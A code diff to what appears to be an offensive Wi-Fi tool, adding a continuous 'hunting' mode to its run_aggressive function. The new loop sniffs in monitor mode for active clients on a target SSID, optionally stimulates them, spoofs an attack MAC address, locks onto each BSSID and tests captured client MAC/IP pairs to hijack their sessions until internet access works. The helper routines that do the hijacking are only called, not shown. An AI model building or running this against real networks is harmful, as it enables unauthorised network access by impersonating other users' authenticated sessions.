@@ -90,19 +90,27 @@ def run_aggressive(args) -> bool:
 
     effective_air_arg = air_only_arg if air_only_arg is not None else air_arg
     if is_air:
-        if isinstance(effective_air_arg, int) and effective_air_arg > 0:
+        if isinstance(effective_air_arg, int) and effective_air_arg >= 0:
             air_duration = effective_air_arg
             user_specified_duration = True
         elif sys.stdin.isatty():
             try:
                 val = get_user_input(f"Enter duration in seconds to listen in monitor mode [default: {DEFAULT_AIR_DURATION}]: ").strip()
-                if val.isdigit() and int(val) > 0:
+                if val.isdigit() and int(val) >= 0:
                     air_duration = int(val)
                     user_specified_duration = True
             except (KeyboardInterrupt, EOFError):
                 pass
 
-    status_str = f"Air Sniffing ({air_duration}s)" if is_air else "Active Exploration"
+    is_continuous_air_only = bool(is_air_only and air_duration == 0)
+
+    if is_air:
+        if air_duration == 0:
+            status_str = "Air Sniffing (Hunting)" if is_air_only else "Air Sniffing (Indefinite)"
+        else:
+            status_str = f"Air Sniffing ({air_duration}s)"
+    else:
+        status_str = "Active Exploration"
     set_main_status(interface=interface, profile=profile, ssid=ssid, status=status_str)
 
     # 1. Initial internet check
@@ -113,6 +121,161 @@ def run_aggressive(args) -> bool:
             return True
         else:
             log_main("[!] Internet online (--force enabled). Continuing exploration...")
+
+    # Continuous Active-Triggered Air-Only Hunting Loop (--air-only 0)
+    if is_continuous_air_only:
+        log_main(f"[+] Continuous Air-Only hunting mode active (--air-only 0).")
+        log_main(f"[*] Monitor mode will run until an active target is detected, then collect for 30s and hijack.")
+        
+        cycle = 1
+        tried_macs = set()
+        last_skip_time = 0
+
+        while True:
+            if has_internet():
+                if not getattr(args, "force", False):
+                    log_main("[+] Internet online.")
+                    handle_auto_share_if_requested(args, interface)
+                    return True
+                else:
+                    log_main("[!] Internet online (--force enabled). Continuing exploration...")
+
+            bssids = scan_bssids_for_ssid(ssid)
+            if not bssids:
+                log_main(f"[-] No BSSIDs found for SSID '{ssid}'. Retrying in 2s...")
+                time.sleep(2.0)
+                cycle += 1
+                continue
+
+            blacklist = load_blacklist()
+            bssids = [b for b in bssids if not is_blacklisted(b.get("bssid", ""), blacklist)]
+            if not bssids:
+                log_main(f"[-] All discovered BSSIDs for SSID '{ssid}' are blacklisted. Retrying in 2s...")
+                time.sleep(2.0)
+                cycle += 1
+                continue
+
+            log_main(f"\n[Cycle #{cycle}] Hunting for active 802.11 client sessions (--air-only 0)...")
+            set_main_status(interface=interface, profile=profile, ssid=ssid, status=f"Air Sniffing (Hunting) [#{cycle}]")
+
+            target_bssid_list = [b["bssid"] for b in bssids]
+            target_channel_list = [b["chan"] for b in bssids if b.get("chan")]
+            threshold_val = getattr(args, "threshold", getattr(args, "bssid_threshold", 10))
+            passive_only = getattr(args, "passive_only", False)
+
+            air_clients_map = sniff_air_clients(
+                target_bssid_list,
+                interface=interface,
+                duration=0,
+                target_channels=target_channel_list,
+                bssids=bssids,
+                bssid_threshold=threshold_val,
+                ssid=ssid,
+                enable_stimulation=not passive_only,
+                trigger_on_active=True,
+                active_trigger_duration=30
+            )
+            if is_monitor_mode_active(interface):
+                set_managed_mode(interface)
+            set_main_status(status=f"Active Exploration [#{cycle}]")
+
+            any_bssid_mode = bool(getattr(args, "any_bssid", False) is True)
+            prioritize_clients = bool(
+                not any_bssid_mode and (getattr(args, "clients", False) is True or getattr(args, "prioritize_clients", False) is True)
+            )
+
+            pooled_air_clients = {}
+            if air_clients_map:
+                for b_clients in air_clients_map.values():
+                    if isinstance(b_clients, dict):
+                        for mac, ip in b_clients.items():
+                            if mac not in pooled_air_clients or (not pooled_air_clients[mac] and ip):
+                                pooled_air_clients[mac] = ip
+
+            ranked_bssids = display_and_select_bssid(
+                bssids,
+                air_clients_map,
+                getattr(args, "select_bssid", False),
+                prioritize_clients=prioritize_clients
+            )
+
+            for idx, item in enumerate(ranked_bssids, start=1):
+                target_bssid = item["bssid"]
+                if is_blacklisted(target_bssid, blacklist):
+                    continue
+
+                signal_pct = item["signal"]
+                chan = item["chan"]
+                target_sec = item.get("security", "")
+
+                try:
+                    clear_window("hijack")
+                    clear_window("scan")
+                    set_scan_status(subnet="N/A", count=0, scan_type="Idle")
+                    set_hijack_status(ip=None, mac=None, technique="Idle")
+
+                    msg = f"[{idx}/{len(ranked_bssids)}] Target: {target_bssid} (Sig: {signal_pct}%, Ch: {chan})"
+                    log_info(msg)
+                    log_main(f"\n{msg}")
+
+                    if is_monitor_mode_active(interface):
+                        set_managed_mode(interface)
+
+                    attack_mac = get_attack_mac(interface)
+                    set_mac_address(interface, attack_mac, profile=profile)
+
+                    if not lock_bssid(target_bssid, profile):
+                        log_main(f"[!] Skipping BSSID {target_bssid} (lock failed).")
+                        continue
+
+                    wait_for_carrier(interface, timeout=6.0)
+
+                    if has_internet(interface=interface, ping_gateway=True):
+                        log_main(f"\033[92m[+] SUCCESS! Internet verified on {target_bssid}!\033[0m")
+                        if not getattr(args, "force", False):
+                            handle_auto_share_if_requested(args, interface)
+                            return True
+
+                    if any_bssid_mode:
+                        bssid_air_clients = pooled_air_clients
+                    else:
+                        bssid_air_clients = air_clients_map.get(target_bssid.lower(), {})
+
+                    auto_params = auto_detect_network_params(target_iface=interface)
+                    new_air_clients = filter_valid_air_clients(
+                        bssid_air_clients, tried_macs, auto_params, bssids, air_clients_map=air_clients_map
+                    )
+
+                    if new_air_clients:
+                        success_air, stop_early = test_air_client_targets(
+                            new_air_clients, interface, target_bssid, chan, profile, tried_macs, auto_params, args,
+                            security=target_sec, air_clients_map=air_clients_map
+                        )
+                        if stop_early or (success_air and not getattr(args, "force", False)):
+                            handle_auto_share_if_requested(args, interface)
+                            return True
+
+                    set_hijack_status(ip=None, mac=None, technique="Idle")
+
+                except (KeyboardInterrupt, MainSkipInterrupt):
+                    now = time.time()
+                    if now - last_skip_time < 1.5:
+                        log_warning("Double Ctrl+C. Exiting...")
+                        log_main("[-] Double Ctrl+C. Exiting...")
+                        if is_monitor_mode_active(interface):
+                            set_managed_mode(interface)
+                        raise
+
+                    last_skip_time = now
+                    log_warning(f"Skipping BSSID {target_bssid} (Ctrl+C)...")
+                    log_main(f"\033[93m[-] Skipping BSSID {target_bssid} (Ctrl+C)...\033[0m")
+                    continue
+
+            log_main(f"[-] Cycle #{cycle} completed without verified internet. Resuming monitor mode to hunt for active targets...")
+            cycle += 1
+            if is_monitor_mode_active(interface):
+                set_managed_mode(interface)
+            time.sleep(1.0)
 
     # 2. Discover BSSIDs for the SSID
     bssids = scan_bssids_for_ssid(ssid)
@@ -147,7 +310,7 @@ def run_aggressive(args) -> bool:
             except (ValueError, TypeError):
                 pass
 
-        if not user_specified_duration and unique_channels:
+        if not user_specified_duration and unique_channels and air_duration > 0:
             scaled_dur = calculate_scaled_air_duration(air_duration, len(unique_channels))
             if scaled_dur > air_duration:
                 log_main(f"[*] Auto-scaling air sniff duration to {scaled_dur}s for {len(unique_channels)} target channels.")
@@ -164,7 +327,8 @@ def run_aggressive(args) -> bool:
             bssids=bssids,
             bssid_threshold=threshold_val,
             ssid=ssid,
-            enable_stimulation=not passive_only
+            enable_stimulation=not passive_only,
+            trigger_on_active=False
         )
         if is_monitor_mode_active(interface):
             set_managed_mode(interface)
